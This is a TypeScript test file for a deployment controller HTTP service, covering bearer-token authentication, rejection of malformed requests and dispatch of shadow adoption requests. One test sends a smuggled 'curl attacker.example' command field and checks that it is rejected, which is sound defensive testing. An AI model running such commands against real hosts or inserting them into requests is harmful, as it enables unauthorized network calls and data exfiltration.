import type { AddressInfo } from 'node:net';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { DeploymentController } from './controller.js';
import { createControllerServer } from './server.js';
import { MemoryOperationStore } from './store.js';

const TOKEN = 'controller-test-token-with-32-bytes';

describe('deployment controller HTTP service', () => {
  let server: ReturnType<typeof createControllerServer>;
  let origin: string;
  const readiness = vi.fn(async () => {});
  const adoptShadow = vi.fn(async () => ({ status: 'completed' as const, operationId: 'dep-1' }));

  beforeEach(async () => {
    const controller = { readiness, adoptShadow } as unknown as DeploymentController;
    server = createControllerServer({
      controller,
      store: new MemoryOperationStore(),
      authToken: TOKEN,
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });

  afterEach(async () => {
    readiness.mockClear();
    adoptShadow.mockClear();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it('authenticates liveness, readiness, and unknown routes', async () => {
    for (const path of ['/healthz', '/readyz', '/missing']) {
      const response = await fetch(`${origin}${path}`);
      expect(response.status).toBe(401);
      expect(response.headers.get('www-authenticate')).toBe('Bearer');
    }
    const health = await fetch(`${origin}/healthz`, { headers: bearer() });
    expect(health.status).toBe(200);
    expect(await health.json()).toEqual({
      status: 'ok',
      service: 'mizuki-deployment-controller',
    });
    const ready = await fetch(`${origin}/readyz`, { headers: bearer() });
    expect(ready.status).toBe(200);
    expect(await ready.json()).toEqual({
      status: 'ok',
      service: 'mizuki-deployment-controller',
    });
    expect(readiness).toHaveBeenCalledOnce();
  });

  it('rejects malformed mutation input before dispatch', async () => {
    const response = await fetch(`${origin}/v1/deployments/shadow`, {
      method: 'POST',
      headers: { ...bearer(), 'content-type': 'application/json', 'idempotency-key': 'bad' },
      body: JSON.stringify({ version: 1, command: 'curl attacker.example' }),
    });
    expect(response.status).toBe(400);
    expect(await response.json()).toMatchObject({ error: { code: 'invalid_request' } });
  });

  it('authenticates and dispatches an exact shadow adoption request', async () => {
    const input = {
      version: 1,
      upgradeId: 'upgrade-1',
      proposalId: 'proposal-1',
      deploymentId: 'dep-1',
      restoreDeploymentId: 'dep-2',
      candidateSha: 'a'.repeat(40),
      candidateArtifactSha256: 'f'.repeat(64),
      baselineDeploymentId: 'dep-shadow-baseline',
      baselineArtifactSha256: 'c'.repeat(64),
      reason: 'schema_incompatible_baseline',
    };
    const unauthorized = await fetch(`${origin}/v1/deployments/shadow/adopt`, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'idempotency-key': 'upgrade-1:adopt-shadow',
      },
      body: JSON.stringify(input),
    });
    expect(unauthorized.status).toBe(401);

    const response = await fetch(`${origin}/v1/deployments/shadow/adopt`, {
      method: 'POST',
      headers: {
        ...bearer(),
        'content-type': 'application/json',
        'idempotency-key': 'upgrade-1:adopt-shadow',
      },
      body: JSON.stringify(input),
    });
    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ status: 'completed', operationId: 'dep-1' });
    expect(adoptShadow).toHaveBeenCalledWith(input, 'upgrade-1:adopt-shadow');
  });
});

function bearer() {
  return { authorization: `Bearer ${TOKEN}` };
}
